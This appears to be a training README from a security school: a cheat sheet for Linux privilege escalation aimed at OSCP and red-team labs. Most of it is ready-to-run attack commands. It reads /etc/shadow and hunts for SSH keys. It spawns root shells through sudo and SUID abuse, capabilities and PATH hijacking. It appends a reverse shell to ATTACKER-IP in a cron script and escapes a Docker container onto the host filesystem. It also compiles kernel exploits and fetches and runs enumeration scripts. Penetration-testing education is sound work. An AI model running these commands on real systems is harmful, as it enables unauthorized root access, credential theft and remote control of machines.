
# 🔴 CYBER PUBLIC SCHOOL
## Linux Privilege Escalation – Advanced Red Team Methodology

> Official Cyber Public School Deep Privilege Escalation Knowledge Base  
> OSCP • Red Team Labs • Real-World Pentesting

---

# 📌 1️⃣ Initial Enumeration

## 🔍 System Information
```bash
hostname
uname -a
uname -r
cat /etc/os-release
cat /proc/version
lscpu
```

## 👤 User & Privileges
```bash
whoami
id
groups
sudo -l
```

## 👥 User Enumeration
```bash
cat /etc/passwd
cat /etc/shadow
last
w
```

---

# 📂 2️⃣ File System Enumeration

## 🔎 Writable Files
```bash
find / -writable -type f 2>/dev/null
find / -perm -2 -type f 2>/dev/null
```

## 🔐 Sensitive Files
```bash
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
grep -Ri password /etc 2>/dev/null
```

---

# 🔥 3️⃣ SUDO Exploitation

## Check SUDO
```bash
sudo -l
```

## Common Abuse Examples
```bash
sudo vim -c ':!/bin/bash'
sudo find . -exec /bin/bash \; -quit
sudo awk 'BEGIN {system("/bin/bash")}'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

---

# 🧨 4️⃣ SUID Exploitation

## Find SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

## Example Abuse
```bash
find . -exec /bin/bash -p \; -quit
```

---

# 🛠 5️⃣ Capabilities Exploitation

## List Capabilities
```bash
getcap -r / 2>/dev/null
```

## Python Privilege Escalation
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

# ⏰ 6️⃣ Cron Job Abuse

## Check Cron
```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
```

## Exploit Writable Script
```bash
echo "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1" >> script.sh
nc -lvnp 4444
```

---

# 🧬 7️⃣ PATH Hijacking

```bash
echo $PATH
```

Create malicious binary:
```bash
echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
```

---

# 🐳 8️⃣ Docker Escape

```bash
id
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

# 🧱 9️⃣ Kernel Exploitation

## Kernel Version
```bash
uname -r
```

## Search Exploit
```bash
searchsploit linux kernel
```

## Compile Exploit
```bash
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

---

# 🌐 🔟 Network Enumeration

```bash
ip a
ss -lntp
netstat -tulpn
arp -a
```

---

# 🧠 Advanced Enumeration Automation

## LinPEAS
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

## Linux Smart Enumeration
```bash
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh -l1
```

---

# 🎯 Privilege Escalation Methodology (Cyber Public School Approach)

1. Basic Enumeration  
2. SUDO Check  
3. SUID & Capabilities  
4. Writable Files  
5. Scheduled Tasks  
6. Kernel & Exploit Research  
7. Container Escape  
8. Persistence  

---

# 🏫 About Cyber Public School

Cyber Public School is a practical cyber security training platform focused on:

- 🔴 OSCP Preparation
- 🔴 Red Team Exploitation Labs
- 🔴 Real-World Attack Simulation
- 🔴 Deep Privilege Escalation Training

---

## ⭐ Support Cyber Public School

If this repository helps you:

- ⭐ Star the repository
- 🍴 Fork it
- 📢 Share with your community

---

© 2026 Cyber Public School  
Ethical Hacking • OSCP Training • Red Team Labs
